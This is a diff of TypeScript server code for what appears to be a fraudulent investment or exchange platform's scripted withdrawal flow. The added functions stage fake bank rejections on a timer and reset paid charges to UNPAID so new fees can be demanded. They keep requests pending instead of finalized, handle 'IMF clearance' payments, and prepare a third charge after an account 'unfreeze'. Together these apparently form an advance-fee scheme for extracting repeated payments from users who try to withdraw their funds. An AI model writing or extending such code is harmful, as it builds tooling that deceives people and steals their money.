@@ -53,7 +53,109 @@ export function scriptRedirectPath(withdrawalId: string, segment: string) {
   return `/dashboard/withdrawals/${withdrawalId}/script/${segment}`;
 }
 
-export async function scriptRefundWithdrawalAndCreditFee(withdrawalId: string, reviewNote: string) {
+export function isWithdrawalScriptCycleComplete(
+  withdrawal: { status: string; scriptPhase: WithdrawalScriptPhase | string },
+  userStep: number
+): boolean {
+  if (withdrawal.status !== "REJECTED") return false;
+  if (withdrawal.scriptPhase === "BANK_REJECTED" && userStep === 0) return true;
+  if (withdrawal.scriptPhase === "NONE" || withdrawal.scriptPhase === "SCRIPT_COMPLETE") return true;
+  return false;
+}
+
+export async function findActiveScriptCycleWithdrawal(userId: string) {
+  const settings = await getWithdrawalScriptSettings();
+  if (!settings.enabled) return null;
+
+  const user = await prisma.user.findUnique({
+    where: { id: userId },
+    select: { withdrawalScriptStep: true },
+  });
+  const userStep = user?.withdrawalScriptStep ?? 0;
+
+  const latest = await prisma.withdrawalRequest.findFirst({
+    where: { userId },
+    orderBy: { createdAt: "desc" },
+    include: { chargePayment: true, imfClearancePayment: true },
+  });
+  if (!latest) return null;
+  if (isWithdrawalScriptCycleComplete(latest, userStep)) return null;
+
+  const phaseActive =
+    latest.scriptPhase !== "NONE" &&
+    latest.scriptPhase !== "SCRIPT_COMPLETE" &&
+    !(latest.status === "REJECTED" && latest.scriptPhase === "BANK_REJECTED");
+
+  if (
+    latest.status === "AWAITING_CHARGE_PAYMENT" ||
+    latest.status === "PENDING" ||
+    phaseActive ||
+    latest.scriptPhase === "SCRIPT_COMPLETE" ||
+    latest.scriptPhase === "BANK_REJECTED"
+  ) {
+    return latest;
+  }
+
+  return null;
+}
+
+async function resetWithdrawalChargeForNextScriptStep(
+  withdrawalId: string,
+  options?: { scriptPhase?: WithdrawalScriptPhase }
+) {
+  const withdrawal = await prisma.withdrawalRequest.findUnique({
+    where: { id: withdrawalId },
+    include: { chargePayment: true },
+  });
+  if (!withdrawal?.chargePayment) return;
+
+  const amount =
+    withdrawal.assignedChargeAmount != null
+      ? Number(withdrawal.assignedChargeAmount)
+      : Number(withdrawal.chargePayment.amountUsd);
+
+  await prisma.withdrawalChargePayment.update({
+    where: { id: withdrawal.chargePayment.id },
+    data: {
+      status: "UNPAID",
+      amountUsd: amount,
+      paidAt: null,
+      txHash: null,
+      proofNote: null,
+      proofImage: null,
+      reviewNote: null,
+    },
+  });
+
+  await prisma.withdrawalRequest.update({
+    where: { id: withdrawalId },
+    data: {
+      status: "AWAITING_CHARGE_PAYMENT",
+      scriptPhase: options?.scriptPhase ?? "NONE",
+    },
+  });
+}
+
+export async function prepareWithdrawalForThirdScriptCharge(userId: string) {
+  const withdrawal = await prisma.withdrawalRequest.findFirst({
+    where: {
+      userId,
+      scriptPhase: "SCRIPT_COMPLETE",
+    },
+    orderBy: { createdAt: "desc" },
+    include: { chargePayment: true },
+  });
+  if (!withdrawal?.chargePayment) return;
+
+  await resetWithdrawalChargeForNextScriptStep(withdrawal.id);
+}
+
+export async function scriptRefundWithdrawalAndCreditFee(
+  withdrawalId: string,
+  reviewNote: string,
+  options?: { finalizeCycle?: boolean }
+) {
+  const finalizeCycle = options?.finalizeCycle ?? true;
   await runInteractiveTransaction(async (tx) => {
     const withdrawal = await tx.withdrawalRequest.findUnique({
       where: { id: withdrawalId },
@@ -118,7 +220,7 @@ export async function scriptRefundWithdrawalAndCreditFee(withdrawalId: string, r
     await tx.withdrawalRequest.update({
       where: { id: withdrawalId },
       data: {
-        status: "REJECTED",
+        status: finalizeCycle ? "REJECTED" : "PENDING",
         reviewNote,
         fundsHeld: false,
       },
@@ -208,26 +310,24 @@ export async function completeWithdrawalScriptPendingTimer(userId: string, withd
 
   if (user.withdrawalScriptStep === 0) {
     const rejectCopy = getBankRejectFailureCopy(withdrawal.method);
-    await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote);
+    await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote, { finalizeCycle: false });
 
     await prisma.user.update({
       where: { id: userId },
       data: { withdrawalScriptStep: 1 },
     });
 
-    await prisma.withdrawalRequest.update({
-      where: { id: withdrawalId },
-      data: { scriptPhase: "BANK_REJECTED" },
-    });
+    await resetWithdrawalChargeForNextScriptStep(withdrawalId, { scriptPhase: "BANK_REJECTED" });
 
     invalidateAdminCaches();
-    return { next: "bank-rejected" as const };
+    return { next: "bank-rejected" as const, intermediate: true };
   }
 
   if (user.withdrawalScriptStep === 1) {
     await scriptRefundWithdrawalAndCreditFee(
       withdrawalId,
-      "Withdrawal could not be completed. Funds and processing fee have been returned while your account is reviewed."
+      "Withdrawal could not be completed. Funds and processing fee have been returned while your account is reviewed.",
+      { finalizeCycle: false }
     );
 
     const adminId = await getSystemAdminUserId();
@@ -267,7 +367,7 @@ export async function completeWithdrawalScriptPendingTimer(userId: string, withd
 
     if (imfAlreadyPaid) {
       const rejectCopy = getBankRejectFailureCopy(withdrawal.method);
-      await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote);
+      await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote, { finalizeCycle: true });
 
       await prisma.user.update({
         where: { id: userId },
@@ -337,6 +437,7 @@ export async function markWithdrawalScriptStepAfterUnfreeze(userId: string) {
     where: { id: userId, withdrawalScriptStep: 2 },
     data: { withdrawalScriptStep: 3 },
   });
+  await prepareWithdrawalForThirdScriptCharge(userId);
 }
 
 export function isScriptPhaseActive(phase: WithdrawalScriptPhase) {
